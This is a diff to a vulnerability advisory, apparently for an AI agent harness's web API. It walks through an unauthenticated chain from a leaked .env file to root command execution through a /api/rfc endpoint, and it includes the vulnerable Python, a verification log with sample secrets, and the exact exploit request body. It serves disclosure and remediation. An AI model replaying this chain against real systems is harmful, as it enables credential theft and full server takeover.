@@ -168,19 +168,60 @@ The script performs the three requests above with `curl` and prints the decoded 
 The highest-value target is not `/etc/passwd`. Read the harness `.env` to obtain every
 provider API key plus `AUTH_PASSWORD` / `RFC_PASSWORD` / `ROOT_PASSWORD`.
 
-## Conditional escalation to RCE
+## Conditional escalation to RCE — now verified end to end
 
-If `.env` contains `RFC_PASSWORD`, `POST /api/rfc` (`requires_auth = False`, no API key) is
-reachable. `helpers/rfc.py:44-66` validates an HMAC over the body and then executes:
+If `.env` contains `RFC_PASSWORD`, `POST /api/rfc` is reachable. That endpoint declares
+`requires_auth = False`, `requires_csrf = False`, and **does not override
+`requires_api_key`** (base default `False`) — so it asks for no credential at all.
+
+`helpers/rfc.py:44-66`:
 
 ```python
-imp = importlib.import_module(module)
-func = getattr(imp, function_name)
+async def handle_rfc(rfc_call, password):
+    if not crypto.verify_data(rfc_call["rfc_input"], rfc_call["hash"], password):
+        raise Exception("Invalid RFC hash")
+    input = json.loads(rfc_call["rfc_input"])
+    return await _call_function(input["module"], input["function_name"], *input["args"], **input["kwargs"])
+
+def _get_function(module: str, function_name: str):
+    imp = importlib.import_module(module)      # any module
+    func = getattr(imp, function_name)         # any attribute
+    return func
 ```
 
-No module or function allowlist. Sending `{"module":"os","function_name":"system","args":["..."]}`
-is arbitrary command execution. When `RFC_PASSWORD` is unset, `_get_rfc_password()` raises
-and the endpoint fails closed.
+Once the HMAC verifies, there is no module or function allowlist. `subprocess.getoutput`
+is a legitimate module attribute, so it runs.
+
+The password comes from step 3: the unauthenticated file read returns `.env`, which holds
+`RFC_PASSWORD` in cleartext. The chain closes.
+
+Verified against the same source build, still with zero credentials:
+
+```
+[环1] GET  /api/csrf_token      -> csrf token + runtime_id
+[环2] POST /api/settings_get    -> mcp_server_token = WP6RL4AjQMd0z20H
+[环3] POST /api/api_files_get   -> .env: RFC_PASSWORD=rfc_secret_abc123
+[环4] POST /api/rfc             -> HTTP 200 "uid=0(root) gid=0(root) groups=0(root)\nzsh"
+```
+
+Request body for step 4:
+
+```json
+{"rfc_input": "{\"module\":\"subprocess\",\"function_name\":\"getoutput\",\"args\":[\"id; hostname\"],\"kwargs\":{}}",
+ "hash": "<HMAC-SHA256(rfc_input, RFC_PASSWORD)>"}
+```
+
+When `RFC_PASSWORD` is unset, `_get_rfc_password()` raises and this endpoint fails closed —
+the one place in the chain where the author chose correctly.
+
+## Why this is a chain and not four separate issues
+
+Each link alone reads as mundane: a fail-open auth check, a missed field in a masking
+list, a path passthrough, an RPC endpoint that trusts a pre-shared key. Chained, they go
+from unauthenticated HTTP to root command execution. The RPC endpoint's own docstring says
+"Secured by pre-shared key" — but the key is retrievable through link 3, so it secures
+nothing.
+
 
 ## Fix
 
